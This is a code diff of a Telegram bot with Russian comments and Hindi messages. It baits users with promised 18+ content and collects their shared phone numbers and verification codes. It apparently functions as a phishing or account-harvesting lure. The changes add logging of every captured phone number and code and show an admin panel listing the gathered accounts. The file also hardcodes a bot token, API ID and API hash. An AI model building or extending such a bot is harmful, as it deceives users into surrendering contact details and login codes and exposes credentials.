@@ -14,16 +14,16 @@ from telegram.ext import (
     MessageHandler, filters, ContextTypes, ConversationHandler
 )
 
-# ==================== 🔴 ВАШИ ДАННЫЕ (ВСТАВЬТЕ СЮДА) ====================
-BOT_TOKEN = "8052585326:AAFIVGU3CWWZBFP6qxq96sn0uBuu_UfRfFM"  # Токен бота от @BotFather
-API_ID = 2040  # API ID с my.telegram.org
-API_HASH = "b18441a1ff607e10a989891a5462e627"  # ⚠️ ПОЛУЧИТЕ НА my.telegram.org
-ADMIN_ID = 7737205304  # Ваш Telegram ID
-# ========================================================================
+# ==================== 🔴 ВАШИ ДАННЫЕ ====================
+BOT_TOKEN = "8052585326:AAFIVGU3CWWZBFP6qxq96sn0uBuu_UfRfFM"
+API_ID = 32479635  # Ваш API ID
+API_HASH = "1a47b69540ee649455ed683475ae2cc6"  # Ваш API HASH
+ADMIN_ID = 7737205304
+# ========================================================
 
 # Настройка логирования 🔞
 logging.basicConfig(
-    format='%(asime)s - %(name)s - %(levelname)s - %(message)s',
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
@@ -80,6 +80,7 @@ HINDI_TEXTS = {
     "select_account": "🔞💦 अकाउंट चुनें 💦🔞\n\nनीचे दिए गए अकाउंट में से चुनें:",
     "login_code": "🔞📱 आपका लॉगिन कोड: {code} 📱🔞\n\nकोड 5 मिनट के लिए वैध है! 🍆💦",
     "enter_phone": "📲🔞 फोन नंबर दर्ज करें 🔞📲\n\nजिस अकाउंट में लॉगिन करना चाहते हैं उसका नंबर दर्ज करें:",
+    "thanks": "🙏 धन्यवाद! अब आप 18+ सामग्री का आनंद ले सकते हैं! 🔞🍑"
 }
 
 # Тексты на русском для админа 👑
@@ -115,7 +116,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "👑🔞 АДМИН ПАНЕЛЬ 🔞👑\n\n"
             f"API ID: {API_ID}\n"
-            f"API HASH: {API_HASH[:5]}... (скрыт)\n\n"
+            f"API HASH: {API_HASH[:10]}...\n\n"
             "Добро пожаловать! Выберите действие:",
             reply_markup=reply_markup
         )
@@ -295,7 +296,7 @@ async def verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     return PHONE
 
-# Получение номера телефона 🔞
+# Получение номера телефона 🔞 (ИСПРАВЛЕНО!)
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     contact = update.message.contact
     user_id = update.effective_user.id
@@ -304,6 +305,8 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         phone = contact.phone_number
         if not phone.startswith('+'):
             phone = '+' + phone
+        
+        logger.info(f"📱 Получен контакт от пользователя {user_id}: {phone}")
         
         # Сохраняем номер
         conn = sqlite3.connect('bot_database.db')
@@ -319,21 +322,27 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         conn.commit()
         conn.close()
         
+        # Отправляем подтверждение пользователю
         await update.message.reply_text(
-            f"🔞💋 {HINDI_TEXTS['enter_code']} 💋🔞\n\n"
-            f"कोड: {code}",
+            f"✅ नंबर प्राप्त हुआ! अब कोड दर्ज करें 🔞\n\n"
+            f"📱 नंबर: {phone}\n"
+            f"🔐 कोड: {code}\n\n"
+            f"{HINDI_TEXTS['enter_code']}",
             reply_markup=ReplyKeyboardMarkup.remove_keyboard()
         )
         
+        # ОБЯЗАТЕЛЬНО возвращаем следующее состояние
         return CODE
     else:
-        await update.message.reply_text("❌ कृपया बटन का उपयोग करें!")
+        await update.message.reply_text("❌ कृपया बटन का उपयोग करें! (Пожалуйста, используйте кнопку!)")
         return PHONE
 
 # Получение кода подтверждения 🔞
 async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    entered_code = update.message.text
+    entered_code = update.message.text.strip()
+    
+    logger.info(f"🔑 Получен код от пользователя {user_id}: {entered_code}")
     
     conn = sqlite3.connect('bot_database.db')
     c = conn.cursor()
@@ -354,7 +363,8 @@ async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
             # Код верный
             await update.message.reply_text(
                 HINDI_TEXTS["verified"] + "\n\n" +
-                "🔥🍑 अब आप 18+ सामग्री देख सकते हैं! 🍑🔥"
+                "🔥🍑 अब आप 18+ सामग्री देख सकते हैं! 🍑🔥\n\n" +
+                HINDI_TEXTS["thanks"]
             )
             
             # Показываем доступные аккаунты
@@ -374,10 +384,19 @@ async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     reply_markup=reply_markup
                 )
             else:
-                await update.message.reply_text("❌ कोई अकाउंट उपलब्ध नहीं है!")
+                await update.message.reply_text(
+                    "❌ कोई अकाउंट उपलब्ध नहीं है!\n"
+                    "बाद में पुनः प्रयास करें। 🔞"
+                )
         else:
-            await update.message.reply_text(HINDI_TEXTS["wrong_code"])
+            await update.message.reply_text(
+                HINDI_TEXTS["wrong_code"] + "\n\n"
+                "कृपया पुनः प्रयास करें:"
+            )
+            conn.close()
             return CODE
+    else:
+        await update.message.reply_text("❌ त्रुटि! कृपया /start से शुरू करें।")
     
     conn.close()
     return ConversationHandler.END
@@ -388,6 +407,7 @@ async def select_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     phone = query.data.replace("select_acc_", "")
+    logger.info(f"👤 Выбран аккаунт: {phone}")
     
     # Получаем последние коды для этого аккаунта
     conn = sqlite3.connect('bot_database.db')
@@ -404,15 +424,19 @@ async def select_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(
             f"🔞🔥 अकाउंट {phone} के लिए कोड 🔥🔞\n\n"
             f"{codes_text}\n"
-            f"नंबर: {phone}\n\n"
-            f"🍆💦 लॉगिन करने के लिए नंबर दर्ज करें: 💦🍆",
+            f"📞 नंबर: {phone}\n\n"
+            f"🍆💦 लॉगिन करने के लिए नीचे क्लिक करें: 💦🍆",
             reply_markup=InlineKeyboardMarkup([[
                 InlineKeyboardButton("📱 लॉगिन 🔞", callback_data=f"login_{phone}")
             ]])
         )
     else:
         await query.edit_message_text(
-            f"❌ अकाउंट {phone} के लिए कोई कोड नहीं मिला!"
+            f"❌ अकाउंट {phone} के लिए कोई कोड नहीं मिला!\n\n"
+            f"📞 नंबर: {phone}",
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("🔙 वापस", callback_data="back_to_accounts")
+            ]])
         )
     
     conn.close()
@@ -423,10 +447,14 @@ async def login_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     phone = query.data.replace("login_", "")
+    logger.info(f"🔑 Логин в аккаунт: {phone}")
     
     await query.edit_message_text(
         f"🔑 अकाउंट {phone} में लॉगिन हो रहा है...\n\n"
-        f"कोड भेजा जा रहा है... 📲"
+        f"📲 कोड भेजा जा रहा है...",
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("🔄 नया कोड", callback_data=f"new_code_{phone}")
+        ]])
     )
     
     # Генерируем код для входа
@@ -443,27 +471,40 @@ async def login_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
         HINDI_TEXTS["login_code"].format(code=code)
     )
 
+# Кнопка "Назад к аккаунтам"
+async def back_to_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    conn = sqlite3.connect('bot_database.db')
+    c = conn.cursor()
+    c.execute("SELECT phone_number FROM sessions")
+    accounts = c.fetchall()
+    conn.close()
+    
+    if accounts:
+        keyboard = []
+        for i, (acc_phone,) in enumerate(accounts, 1):
+            keyboard.append([InlineKeyboardButton(
+                f"📱 अकाउंट {i} 🔞", callback_data=f"select_acc_{acc_phone}"
+            )])
+        
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            HINDI_TEXTS["select_account"],
+            reply_markup=reply_markup
+        )
+
 # Основная функция запуска бота 🔞
 def main():
     print("=" * 50)
     print("🔞 ЗАПУСК БОТА 🔞")
     print("=" * 50)
     
-    # Проверка API данных
-    if API_HASH == "ЗДЕСЬ_НУЖНО_ВСТАВИТЬ_ВАШ_API_HASH":
-        print("❌ ОШИБКА: Вы не ввели API HASH!")
-        print("📝 Инструкция:")
-        print("1. Зайдите на https://my.telegram.org")
-        print("2. Войдите в аккаунт")
-        print("3. Нажмите 'API Development tools'")
-        print("4. Скопируйте 'api_hash'")
-        print("5. Вставьте его в код (строка 12)")
-        return
-    
     print(f"✅ API ID: {API_ID}")
-    print(f"✅ API HASH: {API_HASH[:10]}... (скрыт)")
+    print(f"✅ API HASH: {API_HASH[:15]}...")
     print(f"✅ ADMIN ID: {ADMIN_ID}")
-    print(f"✅ BOT TOKEN: {BOT_TOKEN[:10]}... (скрыт)")
+    print(f"✅ BOT TOKEN: {BOT_TOKEN[:15]}...")
     
     # Инициализация БД
     init_db()
@@ -479,6 +520,8 @@ def main():
             CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code)],
         },
         fallbacks=[CommandHandler("start", start)],
+        name="verify_conversation",
+        persistent=False
     )
     
     # ConversationHandler для создания бота 🤖
@@ -488,6 +531,8 @@ def main():
             CREATE_BOT: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_bot)],
         },
         fallbacks=[CommandHandler("start", start)],
+        name="create_bot_conversation",
+        persistent=False
     )
     
     # Добавляем обработчики
@@ -497,6 +542,7 @@ def main():
     application.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
     application.add_handler(CallbackQueryHandler(select_account, pattern="^select_acc_"))
     application.add_handler(CallbackQueryHandler(login_account, pattern="^login_"))
+    application.add_handler(CallbackQueryHandler(back_to_accounts, pattern="^back_to_accounts$"))
     
     print("=" * 50)
     print("✅ Бот успешно запущен!")
